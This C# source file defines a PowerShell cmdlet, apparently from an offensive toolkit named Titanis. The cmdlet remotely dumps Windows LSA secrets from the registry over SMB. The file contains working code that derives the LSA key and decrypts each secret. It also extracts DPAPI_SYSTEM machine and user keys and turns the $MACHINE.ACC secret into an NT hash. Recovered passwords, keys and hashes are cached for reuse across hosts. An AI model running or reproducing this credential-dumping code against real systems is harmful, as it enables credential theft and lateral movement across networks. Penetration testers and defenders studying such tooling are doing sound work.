using System;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation;
using System.Text.Json;
using System.Threading;
using Titanis.Crypto;
using Titanis.Msrpc.Msrrp;

namespace Titanis.Tbo.Smb2.PowerShell
{
	public sealed class TboRegLsaSecretInfo
	{
		public string ServerName { get; init; } = string.Empty;
		public string Name { get; init; } = string.Empty;
		public string KeyPath { get; init; } = string.Empty;
		public DateTime? LastWriteTime { get; init; }
		public string? Secret { get; init; }
		public string? DpapiMachineKey { get; init; }
		public string? DpapiUserKey { get; init; }
		public byte[]? SecretBytes { get; init; }
		public byte[]? SecretRawBytes { get; init; }
		public byte[]? EncryptedBytes { get; init; }
	}

	[Cmdlet(VerbsCommon.Get, "TBORegLsaSecrets")]
	[OutputType(typeof(TboRegLsaSecretInfo))]
	public sealed class GetTBORegLsaSecrets : TboRegLsaSecretCmdlet
	{
		private const string CacheSourceKind = "Get-TBORegLsaSecrets";

		[Parameter(Position = 1)]
		public string[]? Name { get; set; }

		[Parameter(ValueFromPipelineByPropertyName = true)]
		public byte[]? LsaKeyBytes { get; set; }

		[Parameter(ValueFromPipelineByPropertyName = true)]
		public string? LsaKey { get; set; }

		[Parameter]
		public SwitchParameter Cache { get; set; }

		[Parameter]
		public string? CachePath { get; set; }

		protected override void ProcessRecord(ISmbProviderInfo smb, CancellationToken cancellationToken)
		{
			var ingestCache = this.ResolveCacheIngestionEnabled(this.Cache);
			ExecuteRegistryOperation(smb, cancellationToken, session =>
			{
				var lsaKey = ResolveLsaKey(
					smb,
					session,
					cancellationToken,
					this.LsaKeyBytes,
					this.LsaKey,
					nameof(this.LsaKey),
					out _);
				if (lsaKey == null || lsaKey.Length == 0)
				{
					this.LogWarning(smb, "Get-TBORegLsaSecrets failed to derive the LSA key.");
					return;
				}

				var names = ResolveSecretNames(session.Client, cancellationToken);
				if (names.Count == 0)
					return;

				var filters = BuildNameFilters(this.Name);
				foreach (var name in names)
				{
					if (!MatchesAny(filters, name))
						continue;

					DateTime? lastWriteTime;
					var secretBlob = TryReadSecretValue(session.Client, name, "CurrVal", cancellationToken, out lastWriteTime);
					if (secretBlob == null || secretBlob.Length == 0)
					{
						this.LogWarning(smb, $"Get-TBORegLsaSecrets failed to read secret '{name}': value is empty.");
						continue;
					}

					var decrypted = DecryptLsaSecret(secretBlob, lsaKey);
					if (decrypted == null || decrypted.Length == 0)
					{
						this.LogWarning(smb, $"Get-TBORegLsaSecrets failed to decrypt secret '{name}': data was empty.");
						continue;
					}

					byte[]? payload = null;
					string? secretText = null;
					string? dpapiMachineKey = null;
					string? dpapiUserKey = null;
					if (TryExtractSecretPayload(decrypted, out var payloadBytes))
					{
						payload = payloadBytes;
						secretText = FormatSecretText(name, payloadBytes, TryDecodeSecretString(payloadBytes));
						if (TrySplitDpapiSecret(name, payloadBytes, out var machineKey, out var userKey))
						{
							dpapiMachineKey = machineKey;
							dpapiUserKey = userKey;
						}
					}

					var keyPath = $"HKEY_LOCAL_MACHINE\\{SecretsPath}\\{name}\\CurrVal";
					var info = new TboRegLsaSecretInfo
					{
						ServerName = this.ServerName,
						Name = name,
						KeyPath = keyPath,
						LastWriteTime = lastWriteTime,
						Secret = secretText,
						DpapiMachineKey = dpapiMachineKey,
						DpapiUserKey = dpapiUserKey,
						SecretBytes = payload,
						SecretRawBytes = decrypted,
						EncryptedBytes = secretBlob
					};

					if (ingestCache && payload != null && payload.Length > 0)
						TryIngestRecoveredSecret(smb, info);

					this.WriteObject(info);
				}
			});
		}

		private List<string> ResolveSecretNames(IRegistryClient client, CancellationToken cancellationToken)
		{
			if (this.Name != null && this.Name.Length > 0 && this.Name.All(n => !string.IsNullOrWhiteSpace(n)) && !HasWildcardNames())
				return this.Name.Where(n => !string.IsNullOrWhiteSpace(n)).Distinct(StringComparer.OrdinalIgnoreCase).ToList();

			var secretsSpec = new RegistryPathSpec(
				RegistryRootKey.LocalMachine,
				RemoteRegistryClient.GetRootName(RegistryRootKey.LocalMachine),
				SecretsPath);

			using var secretsKey = OpenRegistryKey(client, secretsSpec, RegistryAccessRights.EnumerateSubkeys, cancellationToken);
			return CollectSubkeys(secretsKey, cancellationToken)
				.Select(r => r.KeyName)
				.Where(name => !string.IsNullOrWhiteSpace(name))
				.ToList();
		}

		private bool HasWildcardNames()
		{
			if (this.Name == null)
				return false;

			foreach (var name in this.Name)
			{
				if (!string.IsNullOrWhiteSpace(name) && WildcardPattern.ContainsWildcardCharacters(name))
					return true;
			}

			return false;
		}

		private void TryIngestRecoveredSecret(ISmbProviderInfo smb, TboRegLsaSecretInfo info)
		{
			if (info.SecretBytes == null || info.SecretBytes.Length == 0)
				return;

			var payloadHex = info.SecretBytes.ToHexString();
			var contextJson = JsonSerializer.Serialize(new
			{
				secretName = info.Name,
				lastWriteTimeUtc = info.LastWriteTime?.ToUniversalTime().ToString("O")
			});

			try
			{
				// Persist the recovered secret payload itself for later host-to-host correlation.
				TboCacheIngestion.AddObservation(new TboCacheIngestion.AddObservationArgs
				{
					ServerName = this.ServerName,
					SourceKind = CacheSourceKind,
					SourcePath = info.KeyPath,

					PrincipalDomain = this.ServerName,
					PrincipalName = info.Name,
					PrincipalType = "LsaSecret",

					CredentialKind = "LSASecret",
					CredentialIdentifier = payloadHex,

					Confidence = 100,
					ContextJson = contextJson,
					CachePath = this.CachePath
				}, msg => LogDiagnostic(smb, msg));

				// DPAPI_SYSTEM split keys are high-value reusable key material.
				if (!string.IsNullOrWhiteSpace(info.DpapiMachineKey))
				{
					TboCacheIngestion.AddObservation(new TboCacheIngestion.AddObservationArgs
					{
						ServerName = this.ServerName,
						SourceKind = CacheSourceKind,
						SourcePath = info.KeyPath,
						PrincipalDomain = this.ServerName,
						PrincipalName = info.Name,
						PrincipalType = "LsaSecret",
						CredentialKind = "DPAPI_SYSTEM_MACHINE_KEY",
						CredentialIdentifier = info.DpapiMachineKey,
						Confidence = 100,
						ContextJson = contextJson,
						CachePath = this.CachePath
					}, msg => LogDiagnostic(smb, msg));
				}

				if (!string.IsNullOrWhiteSpace(info.DpapiUserKey))
				{
					TboCacheIngestion.AddObservation(new TboCacheIngestion.AddObservationArgs
					{
						ServerName = this.ServerName,
						SourceKind = CacheSourceKind,
						SourcePath = info.KeyPath,
						PrincipalDomain = this.ServerName,
						PrincipalName = info.Name,
						PrincipalType = "LsaSecret",
						CredentialKind = "DPAPI_SYSTEM_USER_KEY",
						CredentialIdentifier = info.DpapiUserKey,
						Confidence = 100,
						ContextJson = contextJson,
						CachePath = this.CachePath
					}, msg => LogDiagnostic(smb, msg));
				}

				// $MACHINE.ACC can be transformed into machine account NT hash material.
				if (info.Name.Equals("$MACHINE.ACC", StringComparison.OrdinalIgnoreCase))
				{
					var ntlm = TryComputeNtlmHash(info.SecretBytes);
					if (ntlm != null && ntlm.Length > 0)
					{
						var machineAccountName = ResolveMachineAccountName(this.ServerName);
						TboCacheIngestion.AddObservation(new TboCacheIngestion.AddObservationArgs
						{
							ServerName = this.ServerName,
							SourceKind = CacheSourceKind,
							SourcePath = info.KeyPath,

							PrincipalDomain = this.ServerName,
							PrincipalName = machineAccountName,
							PrincipalType = "MachineAccount",

							CredentialKind = "NTHash",
							CredentialIdentifier = ntlm.ToHexString(),

							Confidence = 100,
							ContextJson = contextJson,
							CachePath = this.CachePath
						}, msg => LogDiagnostic(smb, msg));
					}
				}

				// Keep plaintext secrets queryable when decoding produced non-binary text.
				if (!string.IsNullOrWhiteSpace(info.Secret)
					&& !info.Secret.Equals(payloadHex, StringComparison.OrdinalIgnoreCase))
				{
					TboCacheIngestion.AddObservation(new TboCacheIngestion.AddObservationArgs
					{
						ServerName = this.ServerName,
						SourceKind = CacheSourceKind,
						SourcePath = info.KeyPath,
						PrincipalDomain = this.ServerName,
						PrincipalName = info.Name,
						PrincipalType = "LsaSecret",
						CredentialKind = "Password",
						CredentialIdentifier = info.Secret,
						Confidence = 100,
						ContextJson = contextJson,
						CachePath = this.CachePath
					}, msg => LogDiagnostic(smb, msg));
				}
			}
			catch (Exception ex)
			{
				this.LogException(smb, $"Get-TBORegLsaSecrets failed to write cache observation for secret '{info.Name}' on {this.ServerName}", ex);
				this.LogWarning(smb, $"Get-TBORegLsaSecrets cache write failed for '{info.Name}': {ex.Message}");
			}
		}

		private static byte[]? TryComputeNtlmHash(byte[] payload)
		{
			if (payload == null || payload.Length == 0)
				return null;

			var hashInput = TrimTrailingNulls(payload);
			if (hashInput.Length == 0 || hashInput.Length % 2 != 0)
				return null;

			return SlimHashAlgorithm.ComputeHash<Md4Context>(hashInput);
		}

		private static string ResolveMachineAccountName(string serverName)
		{
			var normalized = DpapiHelpers.NormalizeServerName(serverName);
			if (string.IsNullOrWhiteSpace(normalized))
				return "$MACHINE.ACC";

			var host = normalized;
			var dotIndex = host.IndexOf('.');
			if (dotIndex > 0)
				host = host.Substring(0, dotIndex);

			host = host.Trim();
			if (host.EndsWith("$", StringComparison.Ordinal))
				return host;

			return host + "$";
		}

		private static void LogDiagnostic(ISmbProviderInfo smb, string message)
		{
			if (smb is SmbProviderInfo provider)
				provider.LogDiagnostic(message);
		}

	}
}
